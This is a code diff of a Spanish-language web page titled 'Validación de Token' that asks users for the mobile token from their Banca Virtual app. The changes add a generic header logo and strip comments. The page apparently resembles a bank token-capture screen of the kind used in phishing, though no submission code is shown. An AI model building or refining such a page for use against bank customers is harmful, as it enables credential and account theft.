@@ -37,7 +37,7 @@
             box-shadow: 0 15px 40px rgba(0,0,0,0.1);
             display: flex;
             flex-direction: column;
-            min-height: 500px; /* Ajustado porque quitamos la imagen */
+            min-height: 500px;
             position: relative;
         }
 
@@ -60,13 +60,19 @@
             margin-right: 15px;
         }
 
+        /* --- LOGO EN EL HEADER --- */
+        .header-logo {
+            height: 30px; /* Ajusta el tamaño según tu x.png */
+            object-fit: contain;
+        }
+
         /* --- CONTENIDO --- */
         .app-content {
             padding: 30px 25px;
             flex: 1;
             display: flex;
             flex-direction: column;
-            justify-content: center; /* Centra el contenido verticalmente al no haber imagen */
+            justify-content: center;
         }
 
         .title-section h1 {
@@ -159,7 +165,7 @@
             color: white;
         }
 
-        /* --- ANIMACIÓN DE BOLITAS (IGUAL A SEDE.HTML) --- */
+        /* --- ANIMACIÓN DE BOLITAS --- */
         .balls-container {
             display: flex;
             gap: 15px;
@@ -253,6 +259,8 @@
         <!-- HEADER AZUL -->
         <div class="app-header">
             <div class="back-arrow">&#8592;</div>
+            <!-- LOGO EN EL HEADER -->
+            <img src="x.png" alt="Logo" class="header-logo">
         </div>
 
         <!-- CONTENIDO -->
@@ -260,7 +268,6 @@
             
             <div class="title-section">
                 <h1>Validación de Token</h1>
-                <!-- Texto redactado formalmente -->
                 <p>Por favor, ingresa el token móvil que encontrarás en tu app de Banca Virtual para continuar con el proceso de validación.</p>
             </div>
 
